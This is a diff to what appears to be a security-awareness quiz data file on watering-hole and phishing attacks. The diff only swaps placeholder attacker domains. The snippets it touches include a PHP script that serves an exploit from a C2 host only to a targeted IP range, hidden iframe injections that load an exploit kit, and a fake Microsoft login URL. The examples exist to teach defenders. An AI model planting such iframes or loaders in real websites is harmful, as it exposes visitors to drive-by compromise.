@@ -107,7 +107,7 @@ Get-InboxRule -Mailbox "cfo@kolkata-fintech.in" | Where-Object {
     codeExample: `// Watering Hole IP Filtering Script (PHP):
 $client_ip = $_SERVER['REMOTE_ADDR'];
 if (is_in_range($client_ip, "103.25.10.0/24")) {
-    echo "<script src='https://c2.evil-host.in/v8_exploit.js'></script>"; // Target Infected!
+    echo "<script src='https://attacker-c2.net/v8_exploit.js'></script>"; // Target Infected!
 } else {
     // Return standard benign page to external security researchers
 }`
@@ -162,7 +162,7 @@ Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-1) -EndDate (Get-Date) \`
     hint: "A physical key that only works when inserted into the exact genuine lock in your front door.",
     level: "moderate",
     codeExample: `// FIDO2 WebAuthn EAC Prevention:
-// Phishing Link   : https://login.microsoft.evil-host.in
+// Phishing Link   : https://login.microsoft.attacker-host.net
 // WebAuthn Client : Origin mismatch! Private key refuses to sign challenge.
 // Result          : Attacker obtains 0 passwords, 0 OTPs. EAC completely prevented!`
   },
@@ -213,12 +213,12 @@ Subject: Updated Q3 Gateway Hardware Invoice with New Axis Bank Remittance Accou
   {
     question: "What is 'Drive-by Watering Hole Exploit Delivery' via Malicious Iframes?",
     shortAnswer: "Injecting hidden 1x1 pixel HTML iframes into compromised industry websites that silently redirect visiting browsers to an exploit kit landing page.",
-    explanation: "When an attacker compromises a CMS (WordPress, Drupal) of an industry association site, they insert: `<iframe src='https://c2.evil-exploit.in/gate.php' width='1' height='1' style='display:none;'></iframe>`. When engineers in Barrackpore load the forum, the hidden iframe loads the exploit kit in the background, executing browser memory exploits without displaying any visual anomalies on the webpage.",
+    explanation: "When an attacker compromises a CMS (WordPress, Drupal) of an industry association site, they insert: `<iframe src='https://attacker-c2.net/gate.php' width='1' height='1' style='display:none;'></iframe>`. When engineers in Barrackpore load the forum, the hidden iframe loads the exploit kit in the background, executing browser memory exploits without displaying any visual anomalies on the webpage.",
     hint: "Hiding a microscopic trapdoor on a public sidewalk that drops unsuspecting visitors into a hidden basement.",
     level: "expert",
     codeExample: `<!-- Hidden Watering Hole Iframe Injection -->
 <div class="footer-widget">
-  <iframe src="https://c2.evil-gateway.in/exploit_loader.php" width="0" height="0" style="display:none;visibility:hidden;"></iframe>
+  <iframe src="https://attacker-c2.net/exploit_loader.php" width="0" height="0" style="display:none;visibility:hidden;"></iframe>
 </div>`
   },
   {
